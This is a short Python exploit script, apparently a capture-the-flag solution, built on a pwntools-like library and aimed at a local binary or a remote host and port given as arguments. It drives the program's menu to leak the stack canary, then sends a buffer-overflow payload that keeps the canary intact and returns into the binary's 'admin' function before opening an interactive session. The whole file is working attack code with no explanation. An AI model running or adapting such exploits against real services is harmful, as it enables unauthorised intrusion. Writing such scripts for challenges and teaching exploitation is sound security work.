#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./main', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*0x0000000000401442

c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ==================== EXPLOIT ====================

def leak_canary():
  sla(b'> ', b'1')

  sla(b': ', b'1')
  sla(b': ', b'1')
  sla(b': ', b'5')
  sla(b': ', b'+')

  sla(b'> ', b'2')
  ru(b'id: ')
  cnry= int(rl().split(b" ")[4])
  slog('Canary', cnry)

  return cnry

def ret2win(cnry):

  pl = cyclic(0x3e8) + p64(cnry) + p64(0) + p64(0x0000000000401629) + p64(exe.sym.admin)
  sla(b'-> ', pl)

def exploit():

  cnry = leak_canary()
  ret2win(cnry)

  interactive()

if __name__ == '__main__':
  exploit()


